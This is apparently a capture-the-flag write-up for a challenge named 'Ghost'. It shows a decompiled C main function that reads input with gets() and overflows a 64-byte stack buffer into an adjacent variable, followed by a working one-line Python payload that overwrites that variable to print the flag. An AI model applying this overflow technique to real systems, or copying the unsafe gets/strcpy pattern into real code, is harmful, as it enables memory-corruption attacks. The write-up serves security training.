# Ghost

function main

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char dest[64]; // [rsp+10h] [rbp-160h] BYREF
  int v5; // [rsp+50h] [rbp-120h]
  char src[264]; // [rsp+60h] [rbp-110h] BYREF
  unsigned __int64 v7; // [rsp+168h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  printCatArt();
  puts("Ghostly Haunting: Mysterious Apparitions Spotted in Abandoned Mansion!");
  fflush(_bss_start);
  v5 = 0;
  printf("ghost code: ");
  gets(src);
  strcpy(dest, src);
  if ( v5 == 0x44434241 )
    puts("BDSEC{you_need_to_find_flag_in_server!}");
  else
    puts("You have escaped the ghost!");
  return 0;
}
```

final payload:

```
python -c "import sys; import struct; sys.stdout.buffer.write(b'A'*64 + struct.pack('<I', 0x44434241))" | ./ghost

```
